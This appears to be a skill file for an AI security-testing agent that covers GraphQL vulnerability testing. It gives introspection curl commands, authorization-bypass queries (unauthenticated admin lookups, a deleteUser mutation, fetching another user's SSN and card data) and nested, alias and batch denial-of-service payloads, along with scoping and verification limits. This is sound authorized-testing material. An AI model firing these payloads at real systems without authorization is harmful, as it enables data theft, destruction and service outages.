---
name: attack-graphql
description: "Test GraphQL schema exposure, object-level authorization, batching, and query-cost controls with bounded requests"
category: "web-application"
version: "1.1.0"
author: "cyberstrike-official"
tags:
  - graphql
  - api
  - web
  - dos
  - attack
tech_stack:
  - web
  - graphql
cwe_ids:
  - CWE-200
  - CWE-284
  - CWE-770
chains_with:
  - attack-idor-automation
prerequisites: []
severity_boost:
  attack-idor-automation: "GraphQL introspection reveals IDOR-vulnerable queries"
---

# GraphQL Vulnerability Testing

## Objective

Exploit GraphQL-specific vulnerabilities including schema exposure, query complexity abuse, and authorization bypass.

## Testing Methodology

### Phase 1: Automated Testing

```bash
# Full GraphQL test suite
attack_script graphql_tester "https://TARGET/graphql" \
  -H "Authorization:Bearer TOKEN" \
  --json-output

# Custom depth/batch
attack_script graphql_tester "https://TARGET/graphql" \
  --depth 15 --batch-count 100
```

### Phase 2: Introspection Query

```bash
# Full schema extraction
curl --max-time 15 --connect-timeout 5 -s -X POST https://TARGET/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name type { name } } } mutationType { fields { name args { name type { name } } } } queryType { fields { name } } } }"}'
```

If introspection is enabled, map all types, queries, mutations, and subscriptions.

### Phase 3: Authorization Bypass

```graphql
# Access admin queries without auth
{ adminUsers { id email role } }

# Mutation without auth
mutation { deleteUser(id: "123") { success } }

# Access other user's data
{ user(id: "OTHER_USER_ID") { email ssn creditCard } }
```

### Phase 4: Complexity / DoS

```graphql
# Deeply nested query
{ users { posts { comments { author { posts { comments { author { id } } } } } } } }

# Alias multiplication
{ a1: __typename a2: __typename ... a100: __typename }

# Batch queries (array)
[{"query":"{ __typename }"}, {"query":"{ __typename }"}, ... x50]
```

### Phase 5: Directive Abuse

```graphql
# Skip/include directive for info leakage
{ user(id: "1") { name email @skip(if: false) secretField @include(if: true) } }

# Field suggestions (error-based enum)
{ user { nonExistentField } }
# Error may suggest: "Did you mean: password, secret_key?"
```

## What Constitutes a Finding

| Finding | Severity |
|---------|----------|
| Introspection enabled (schema exposed) | Medium (P3) |
| Admin mutations accessible without auth | Critical (P1) |
| Other user data accessible (IDOR) | High (P2) |
| DoS via complexity (server timeout/crash) | Medium (P3) |
| Batch queries bypass rate limiting | Medium (P3) |

## Evidence Requirements

- GraphQL endpoint URL
- Query/mutation sent
- Response showing unauthorized data
- For introspection: schema dump (types, mutations, queries)
- For DoS: response timing proving server overload

## Tools

- `attack_script graphql_tester` — automated introspection + DoS + batch testing

## Coverage Matrix: Object, Field, Mutation, and Batching

Test GraphQL authorization at more than one layer. Use two controlled accounts with different roles and compare: direct object lookup (`node`/global ID where supported), nested object relationships, sensitive fields, and mutations that change a test-owned record.

- Compare GraphQL operations with the equivalent REST action where one exists. If REST denies an action but a GraphQL mutation permits it, preserve both sanitized request/response pairs.
- Try a small number of aliases in one request to determine whether throttling is applied per HTTP request or per operation. Do not scale into OTP guessing, broad enumeration, or resource exhaustion; stop once the enforcement gap is demonstrated.
- Introspection being enabled is a discovery signal, not an impact claim. Likewise, a large query, deep nesting, or a `200 OK` response is not proof of denial-of-service or authorization bypass.
- For query-cost/depth checks, begin with a baseline and increase one dimension at a time using bounded requests. Record latency and response shape; stop on degradation and do not perform load testing unless explicitly allowed.

## Verification and False Positives

- Introspection being enabled is not automatically a vulnerability. Determine whether the schema exposes sensitive implementation details that create a concrete risk under the program's policy.
- Test object- and field-level authorization with two accounts you control. Compare the same query using each account and verify whether unauthorized fields or objects are returned; do not enumerate real users' identifiers.
- Test mutations with a harmless record owned by your test account. A successful HTTP status does not prove the mutation executed; inspect the GraphQL `errors` array and the resulting test record.
- Probe depth, aliases, batching, and complexity with small, bounded requests first. Stop if latency, errors, or resource use rises materially; do not perform load or denial-of-service testing unless explicitly permitted.
- GraphQL commonly returns HTTP 200 for both successful and failed operations. Validate the JSON `data` and `errors` fields, returned object ownership, and actual state change.
- Use request timeouts and low request rates. Preserve sanitized query/response pairs and the account role used for each test.
- [uphiago/recon-skills — GraphQL hunting](https://github.com/uphiago/recon-skills/blob/main/redteam/hunt-graphql/SKILL.md) (external research reference; not a local Cyber Strike skill path).
- [elementalsouls/Claude-BugHunter — GraphQL hunting](https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-graphql/SKILL.md) (external research reference; not a local Cyber Strike skill path).

## References

- [PortSwigger: GraphQL](https://portswigger.net/web-security/graphql)
- [HackerOne: GraphQL Bugs](https://www.hackerone.com/vulnerability-management/graphql-security-guide)
